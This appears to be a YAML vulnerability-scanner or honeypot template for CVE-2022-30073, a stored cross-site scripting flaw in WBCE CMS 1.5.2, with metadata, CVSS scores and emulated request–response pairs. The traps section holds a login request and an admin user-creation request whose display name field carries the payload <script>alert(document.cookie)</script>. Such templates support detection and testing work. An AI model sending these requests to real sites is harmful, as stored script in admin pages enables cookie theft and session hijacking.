id: CVE-2022-30073
info:
  name: WBCE CMS 1.5.2 - Cross-Site Scripting
  author: arafatansari
  description: 'WBCE CMS 1.5.2 contains a stored cross-site scripting vulnerability
    via \admin\user\save.php Display Name parameters.

    '
  severity: medium
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    inject malicious scripts into web pages viewed by users, leading to potential
    data theft, session hijacking, or defacement of the affected website.

    '
  remediation: 'Upgrade to a patched version of WBCE CMS or apply the vendor-supplied
    patch to mitigate this vulnerability.

    '
  reference:
  - https://github.com/APTX-4879/CVE
  - https://github.com/APTX-4879/CVE/blob/main/CVE-2022-30073.pdf
  - https://nvd.nist.gov/vuln/detail/CVE-2022-30073
  - https://github.com/ARPSyndicate/kenzer-templates
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 5.4
    cve-id: CVE-2022-30073
    cwe-id: CWE-79
    epss-score: 0.00205
    epss-percentile: 0.57793
    cpe: cpe:2.3:a:wbce:wbce_cms:1.5.2:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 4
    vendor: wbce
    product: wbce_cms
  tags: cve2022,cve,wbcecms,xss,wbce
traps:
- request:
    method: POST
    path: /admin/login/index.php
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: 'url=&username_fieldname=username_axh5kevh&password_fieldname=password_axh5kevh&username_axh5kevh={{username}}&password_axh5kevh={{password}}&submit=Login

      '
  response:
    status_code: 200
    headers:
      VulTrap: text/html
    body: <p><b><script>alert(document.cookie)</script>WBCECMS
- request:
    method: GET
    path: /admin/users/index.php
    headers: {}
    body: ''
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: POST
    path: /admin/users/index.php
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: 'formtoken={{formtoken}}&user_id=&username_fieldname=username_tep83j9z&username_tep83j9z=testme2&password=temp1234&password2=temp1234&display_name=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&email=testme2%40abc.com&home_folder=&groups%5B%5D=1&active%5B%5D=1&submit=

      '
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: GET
    path: /admin/users/index.php
    headers: {}
    body: ''
  response:
    status_code: 200
    headers: {}
    body: ''
